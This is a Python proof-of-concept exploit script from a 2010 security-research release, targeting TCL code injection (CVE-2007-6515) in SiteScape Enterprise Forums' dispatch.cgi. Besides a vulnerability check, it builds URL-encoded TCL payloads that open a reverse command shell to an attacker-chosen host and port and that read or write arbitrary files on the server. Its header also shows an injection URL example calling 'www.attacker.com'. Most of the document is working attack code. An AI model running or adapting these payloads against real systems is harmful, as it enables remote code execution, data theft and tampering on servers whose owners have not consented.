"""
 -*- coding: utf-8 -*-
 
       sitescape_sploit.py
        
       Copyright 2010 Spencer McIntyre <zeroSteiner@gmail.com>
        
       This program is free software; you can redistribute it and/or modify
       it under the terms of the GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.
        
       This program is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       GNU General Public License for more details.
        
       You should have received a copy of the GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
       MA 02110-1301, USA.
 
Discovered: 12-07-10
By: Spencer McIntyre (zeroSteiner) SecureState R&D Team
www.securestate.com
 
 
Background:
-----------
 
 
New Details:
------------
Confirmation that SiteScape servers are vulnerable to TCL injection allowing remote code execution through TCL payloads. SecureState has released proof of concept exploit code for this vulnerability.
 
 
Vulnerable Versions:
--------------------
Tested on SiteScape Enterprise Forums version 7, others may be vulnerable.
 
 
TCL Code Injection:
-------------------
++ Replace "ping www.attacker.com" with something useful
http://www.website.com/dispatch.cgi/0;set fl [open "|ping www.attacker.com" ]
 
 
References:
-----------
BID     http://www.securityfocus.com/bid/26963
CVE     http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6515
Post    http://securityvulns.com/Sdocument702.html
PoC     http://www.securestate.com/Documents/sitescape_sploit.txt
Whitepaper http://www.securestate.com/Downloadables/Documents/whitepapers-profiling-penetration/SiteScape_TCL_Code_Injection.pdf
"""
 
def main():
    import sys
    import socket
    import urllib2
    import argparse
     
    __version__ = &#039;0.3&#039;
             
    parser = argparse.ArgumentParser(description = &#039;Site Scape Exploit Tool&#039;, conflict_handler=&#039;resolve&#039;)
    parser.add_argument(&#039;-t&#039;, &#039;--target&#039;, dest = &#039;target_uri&#039;, action = &#039;store&#039;, required = True, help = &#039;the uri to dispatch.cgi&#039;)
    parser.add_argument(&#039;-m&#039;, &#039;--mode&#039;, dest = &#039;mode&#039;, action = &#039;store&#039;, required = True, choices = [&#039;c&#039;, &#039;s&#039;, &#039;u&#039;, &#039;d&#039;], help = &#039;attack mode&#039;)
    parser.add_argument(&#039;-h&#039;, &#039;--lhost&#039;, dest = &#039;lhost&#039;, action = &#039;store&#039;, default = &#039;&#039;, help = &#039;host to connect back to&#039;)
    parser.add_argument(&#039;-p&#039;, &#039;--lport&#039;, dest = &#039;lport&#039;, action = &#039;store&#039;, default = 0, help = &#039;the port to connect back to&#039;)
    parser.add_argument(&#039;-f&#039;, &#039;--file&#039;, dest = &#039;file_name&#039;, action = &#039;store&#039;, default = &#039;&#039;, help = &#039;the file name to upload/download, path must be relative&#039;)
    parser.add_argument(&#039;-v&#039;, &#039;--version&#039;, action = &#039;version&#039;, version = sys.argv[0][2:] + &#039; Version:&#039; + __version__)
    results = parser.parse_args()
     
    target = results.target_uri
     
    if target.split(&#039;/&#039;)[len(target.split(&#039;/&#039;)) - 1] != &#039;dispatch.cgi&#039;:
        print &#039;Invalid Target&#039;
        return 0
     
    if results.mode == &#039;c&#039;:
        sys.stdout.write(&#039;Checking... &#039;)
        sys.stdout.flush()
        try:
            httpConn = urllib2.urlopen(target + &#039;/0;test&#039;)
            page = httpConn.read()
        except urllib2.HTTPError, error:
            print &#039;\nThe Host Is NOT Vulnerable&#039;
            return 0
        except ValueError:
            print &#039;\nInvalid Target&#039;
            return 0
        except:
            print &#039;\nAn Error Has Occured&#039;
            return 0    # this should not happen
        sys.stdout.write(&#039;Done.\n&#039;)
        sys.stdout.flush()
        if &#039;invalid command name "test"&#039; in page:
            print &#039;The Host Is Vulnerable&#039;
            return 0
        else:
            print &#039;The Host Is NOT Vulnerable&#039;
            return 0
    if results.lhost:
        lhost = results.lhost
    else:
        print sys.argv[0] + &#039;: error: argument -h/--lhost is required when mode is not \&#039;c\&#039;&#039;
        return 0
    if results.lport:
        lport = results.lport
    else:
        print sys.argv[0] + &#039;: error: argument -p/--lport is required when mode is not \&#039;c\&#039;&#039;
        return 0
             
    if results.mode == &#039;s&#039;:
        exploit = target + &#039;/0;set%20sock%20[socket%20&#039; + lhost + &#039;%20&#039; + str(lport)
        exploit = exploit + &#039;%20]%20;fconfigure%20$sock%20-buffering%20line;while%20%221%22%20{%20gets%20$sock%20cmd;%20if%20{%20[catch%20{set%20fl%20[open%20%22|$cmd%22%20]%20}%20fid]%20}%20{%20%20puts%20$sock%20%22Command%20Error%22%20}%20else%20{%20set%20data%20[read%20$fl]%20;%20puts%20$sock%20$data;%20}%20}%20;thisTx%20accept%20;exit%20&#039;
        print &#039;Sending Exploit...\n(This process will sometimes hang on success until the connection is terminated)&#039;
        try:
            httpConn = urllib2.urlopen(exploit)
        except:# urllib2.HTTPError:
            pass
        return 0
         
    if results.file_name:
        file_name = results.file_name
    else:
        print sys.argv[0] + &#039;: error: argument -f/--file_name is required when mode is not \&#039;c\&#039; or \&#039;s\&#039;&#039;
        return 0
    if file_name[0] in [&#039;\\&#039;, &#039;/&#039;]:
        print &#039;The path has to be relative ie: ../../tmp/foobar.txt&#039;
        return 0
    forward = file_name.count(&#039;/&#039;)
    backward = file_name.count(&#039;\\&#039;)
    path = &#039;&#039;
    if not forward == 0 and not backward == 0:
        for i in range(0, file_name.count(&#039;..&#039;)):
            path = path + &#039;cd%20..;&#039;
        del i
        file_name = file_name.split(&#039;..&#039;)
        file_name = file_name.pop()
        if forward > backward:
            tmp = file_name.split(&#039;/&#039;)[:-1]
            file_name = file_name.split(&#039;/&#039;).pop()
        else:
            tmp = file_name.split(&#039;\\&#039;)[:-1]
            file_name = file_name.split(&#039;\\&#039;).pop()
        for part in tmp:
            if part:
                path = path + &#039;cd%20&#039; + part + &#039;;&#039;
     
    if results.mode == &#039;d&#039;:
        exploit = target + &#039;/0;set%20sock%20[socket%20&#039; + lhost + &#039;%20&#039; + str(lport)
        exploit = exploit + &#039;]%20;&#039; + path + &#039;fconfigure%20$sock%20-buffering%20line;set%20fl%20[open%20%22&#039; + file_name.replace(&#039; &#039;, &#039;%20&#039;) + &#039;%22%20r]%20;fconfigure%20$fl%20-translation%20binary;set%20data%20[read%20$fl]%20;puts%20$sock%20$data;%20thisTx%20accept%20;exit%20;&#039;
        try:
            httpConn = urllib2.urlopen(exploit)
        except urllib2.HTTPError:
            pass
        except:
            print &#039;An Error Has Occured&#039;
        return 0
         
    elif results.mode == &#039;u&#039;:
        exploit = target + &#039;/0;set%20sock%20[socket%20&#039; + lhost + &#039;%20&#039; + str(lport)
        exploit = exploit + &#039;]%20;&#039; + path + &#039;fconfigure%20$sock%20-buffering%20line;set%20fl%20[open%20%22&#039; + file_name.replace(&#039; &#039;, &#039;%20&#039;) + &#039;%22%20w]%20;fconfigure%20$fl%20-buffering%20line;set%20data%20[read%20$sock]%20;puts%20$fl%20$data;%20thisTx%20accept%20;exit%20;&#039;
        try:
            httpConn = urllib2.urlopen(exploit)
        except urllib2.HTTPError:
            pass
        except:
            print &#039;An Error Has Occured&#039;
        return 0
         
    return 0
 
if __name__ == &#039;__main__&#039;:
    main()



